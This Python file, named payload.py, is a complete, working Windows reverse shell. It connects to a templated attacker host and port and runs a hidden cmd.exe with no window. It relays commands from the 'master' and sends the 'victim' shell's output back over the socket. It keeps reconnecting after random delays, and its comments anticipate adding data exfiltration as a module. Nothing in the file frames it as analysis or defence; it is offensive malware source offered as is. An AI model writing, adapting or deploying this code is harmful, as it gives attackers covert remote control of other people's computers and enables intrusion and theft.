# payload.py
# The True Soul. It connects, it speaks, it obeys. No more silence.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##

# NOTE: The exfiltration logic has been removed from this core payload
# to ensure absolute shell stability. It can be re-introduced as a
# dynamically loaded module in a future enhancement.

def run_conduit():
    """The main reverse shell loop, rebuilt for absolute reliability."""
    while True:
        s_obj = None
        try:
            # Create a socket and connect to the master
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))

            # Determine the sacred starting ground: the user's home directory
            user_profile = os.environ.get('USERPROFILE', 'C:\\')

            # Launch the command shell, merging its error output with its standard output
            # This simplifies our logic by only needing to listen to one pipe.
            p = subprocess.Popen(
                ['cmd.exe'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, # CRITICAL: Merge stderr into stdout
                cwd=user_profile,
                creationflags=0x08000000, # CREATE_NO_WINDOW
                shell=False
            )

            # --- The Two Pillars of Communication ---

            # Pillar 1: A thread to continuously send the shell's output to the master.
            # This thread will immediately send the initial command prompt, breaking the deadlock.
            def victim_to_master():
                try:
                    while True:
                        # Read one byte at a time to ensure responsiveness
                        output = p.stdout.read(1)
                        if not output:
                            break
                        s_obj.sendall(output)
                except:
                    pass # The connection is likely broken
                finally:
                    s_obj.close()

            # Pillar 2: The main thread will listen for commands from the master.
            def master_to_victim():
                try:
                    while True:
                        command = s_obj.recv(4096)
                        if not command:
                            break
                        p.stdin.write(command)
                        p.stdin.flush()
                except:
                    pass # The connection is likely broken
                finally:
                    p.terminate()
            
            # --- The Awakening ---
            sender_thread = threading.Thread(target=victim_to_master, daemon=True)
            sender_thread.start()

            # The main thread becomes the receiver
            master_to_victim()
            
            # Clean up after the connection closes
            p.wait()
            s_obj.close()

        except Exception:
            # If any part of the connection fails, rest and try again.
            time.sleep(random.randint(20, 40))
        finally:
            if s_obj:
                s_obj.close()

if __name__ == "__main__":
    run_conduit()